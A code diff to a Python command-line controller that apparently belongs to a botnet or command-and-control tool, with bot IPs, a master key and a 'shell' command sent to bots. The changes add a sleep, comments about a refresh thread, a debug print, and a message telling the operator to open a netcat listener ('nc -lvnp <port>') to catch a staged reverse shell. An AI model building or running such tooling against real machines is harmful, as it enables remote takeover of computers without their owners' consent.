@@ -6,7 +6,8 @@ import os
 import platform 
 import asyncio
 import threading 
-import json 
+import json
+import pathlib 
 from multiprocessing.pool import ThreadPool
 import time
 from subprocess import Popen, PIPE
@@ -19,6 +20,7 @@ REGISTERKEY = "registerkey"
 TIMER = '12'
 
 #URL = 'http://localhost:5000'
+# What if there is a thread in master which runs and hits server's refresh endpoint every 10 seconds 
 
 
 async def get_result(bot_ip):
@@ -245,10 +247,12 @@ ___  ___          _              _____                       _
         masterkey = MASTERKEY 
         cmd = "shell " + args.port 
 
+        time.sleep(10)
+
         data = {'masterkey': masterkey, 'cmd': cmd}
         res = requests.post(url, data=data)
 
-        output_shell = ansi.style("[+] Reverse shell staged. Openup netcat in a separate terminal! Port: " + args.port, fg='green', bold=True)
+        output_shell = ansi.style("[+] Reverse shell staged. Openup netcat in a separate terminal! 'nc -lvnp <port>' " + args.port, fg='green', bold=True)
          
         self.poutput(output_shell)
 
@@ -323,8 +327,9 @@ ___  ___          _              _____                       _
 
 
 
-
+# setup a thread here which hits the refresh endpoint every 10 seconds 
 if __name__ == '__main__':
     import sys
     c = CmdLineApp()
+    print("hello word")
     sys.exit(c.cmdloop())
